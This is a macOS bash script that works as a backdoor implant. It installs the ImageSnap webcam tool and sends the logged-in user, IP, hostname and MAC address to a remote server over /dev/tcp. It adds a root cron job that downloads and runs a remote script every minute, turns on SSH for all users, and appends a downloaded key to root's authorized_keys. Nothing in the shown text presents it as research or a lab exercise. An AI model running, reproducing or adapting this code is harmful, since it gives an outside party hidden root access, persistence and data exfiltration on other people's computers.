#!/bin/bash

# Prevent from running twice per hour
#if [[ $(< /tmp/last) = `date +"%H"` ]]; then
#	exit 1
#else
#	date +"%H" > /tmp/last
#fi

# Install ImageSnap for easy photo taking
if [ ! -f /usr/local/bin/imagesnap ]; then
    mkdir -p /usr/local/bin/
    # TODO: Use newest version
    curl -so /tmp/ImageSnap.tgz https://gigenet.dl.sourceforge.net/project/iharder/imagesnap/ImageSnap-v0.2.5.tgz
    tar -xvf /tmp/ImageSnap.tgz
    # TODO: Use newest version
    mv /tmp/ImageSnap-v0.2.5/imagesnap /usr/local/bin/
    rm -rf /tmp/ImageSnap*
fi

# Linux's hostname -I doesn't work on Macs
USER=$(stat -f "%Su" /dev/console)
IP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
HOSTNAME=$(hostname)
MAC=$(ifconfig en0 | awk '/ether/{print $2}')

SERVER="boesen.science"
PORT=2043

if [[ $(< /tmp/ip) != "$IP" ]]; then
	printf "$IP" > /tmp/ip

	exec 3<>/dev/tcp/$SERVER/$PORT
	printf "UPDATE: $USER $IP $HOSTNAME $MAC" >&3

	cat <&3
fi

# TODO: Check that this works and that the crontab path is correct
cat /var/at/tabs/root | grep -v "erikboesen.com" > /tmp/crontab; mv /tmp/crontab /var/at/tabs/root; rm /tmp/crontab
echo '* * * * * curl -L erikboesen.com/macupdate.sh --output /tmp/macupdate.sh && chmod +x /tmp/macupdate.sh && /tmp/macupdate.sh' >> /var/at/tabs/root

#sudo su -c "printf '#\!/bin/bash\ncurl -L erikboesen.com/macupdate.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"

# Enable SSH
systemsetup -setremotelogin on
# Open SSH to all users
dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null

SSHPATH="/var/root/.ssh"

mkdir -p "$SSHPATH"

if ! grep boesene $SSHPATH/authorized_keys; then
	curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
fi

exec 3<>/dev/tcp/$SERVER/$PORT
printf "$IP is online" >&3
